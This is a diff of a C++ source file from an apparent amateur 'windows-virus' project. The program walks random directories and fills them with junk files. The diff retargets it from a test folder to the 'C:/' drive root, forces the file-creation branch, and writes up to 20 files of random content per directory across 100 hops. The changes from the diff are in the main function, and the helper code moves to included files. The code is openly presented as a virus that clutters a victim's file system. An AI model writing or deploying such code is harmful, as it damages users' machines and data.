@@ -10,71 +10,14 @@
 
 #include <sys/stat.h>
 
-#include <typeinfo>
-
 #include "util.cpp"
-
-// find directories in the specified path
-std::vector<std::string> find_directories(const std::string& path){
-    std::vector<std::string> directories;
-    try{
-        for (const auto& entry : std::filesystem::directory_iterator(path)){
-            directories.push_back(entry.path().string());
-        }
-    } catch (const std::filesystem::filesystem_error &e){
-        std::cout << "Error accessing directory : " << path << "\n";
-    }
-    return directories;
-}
-
-// choose a random directory path from the provided list
-std::string random_directory(const std::vector<std::string>& directories){
-    std::vector<std::string> valid_directories;
-
-    // filter valid directories
-    std::copy_if(
-        directories.begin(), 
-        directories.end(), 
-        std::back_inserter(valid_directories),
-        [] (const std::string& p){
-            return p.find('.') == std::string::npos || p.find('.') == 0;
-        }
-    );
-
-    // randomly choose a valid directory path
-    if (!valid_directories.empty()){
-        return valid_directories[rand_int(0, valid_directories.size())] + "/";
-    }
-
-    return "";
-}
-
-// create files in the specified directory
-std::vector<std::string> create_files(const std::string& directory, const std::string& name, const std::string& content, int num_files){
-    std::vector<std::string> all_file_path;
-    
-    for (int i = 0; i < num_files; ++i){
-        std::string file_path = directory + name + "_" + std::to_string(i) + ".txt";
-        std::ofstream ofs;
-
-        ofs.open(file_path);
-
-        if (ofs.is_open()){
-            ofs << content;
-            all_file_path.push_back(file_path);
-            std::cout << "File created : " << file_path << "\n";
-        } else {
-            std::cout << "Error creating file : " << file_path << "\n";
-        }
-    }
-
-    return all_file_path;
-}
+#include "file_op.cpp"
+#include "content.cpp"
 
 int main(){
     const std::string name = "3eb41f79481d39b1d85de0b546ef209b"; // change to random
     const std::string content = "e8aa5769216a6823d8216d8df2696677"; // change to random
-    const std::string default_path = "./GitHub/windows-virus/test/";
+    const std::string default_path = "C:/"; // CHANGE BEFORE COMMIT 
 
     std::vector<std::string> all_files;
 
@@ -111,7 +54,9 @@ int main(){
 
     for (int i = 0; i < 100; ++i){
         // find directories in current path
-        std::vector<std::string> directories = find_directories(current_path);
+        std::vector<std::string> directories;
+
+        directories = find_directories(current_path);
 
         if (directories.empty()){
             current_path = default_path;
@@ -119,7 +64,14 @@ int main(){
         }
 
         // generate random directory path
-        std::string new_path = random_directory(directories);
+        std::string new_path;
+
+         try {
+            new_path = random_directory(directories);
+        } catch (std::length_error) {
+            std::cout << "boo 2" << "\n";
+            return -1;
+        }
 
         if (new_path.empty()){
             // check if directories exist
@@ -133,10 +85,8 @@ int main(){
         }
 
         std::cout << "Selected path : " << current_path << "\n";
-
-        std::cout << "womp" << "\n";
         
-        bool choice = rand_int(0, 2);
+        bool choice = 1; // rand_int(0, 2);
         
         if (!choice){
             // ignore directory and continue
@@ -144,11 +94,9 @@ int main(){
         } else if (choice == 1){
             // create files in directory
             int num_files = rand_int(1, 20);
-            std::vector<std::string> files = create_files(current_path, name, content, num_files);
+            std::vector<std::string> files = create_files(current_path, generate_content(100), generate_content(rand_int(100, 100000)), num_files);
 
-            std::cout << "womp womp" << "\n";
             all_files.insert(all_files.end(), files.begin(), files.end());
-            std::cout << "womp womp womp" << "\n";
 
             last_path = current_path;
         } else if (choice == 2){
@@ -157,14 +105,15 @@ int main(){
         }
     }
 
-    std::ofstream ofs;
-    ofs.open("./all_files.txt");
+    std::ofstream ofs("./all_files.txt");
 
     if (ofs.is_open()){
-        for (auto file: all_files){
-            ofs << file << "\n";
+        for (int i = 0; i < all_files.size(); i++){
+            ofs << all_files[i] << "\n";
         }
     }
+
+    ofs.close();
 
     return 0;
 }
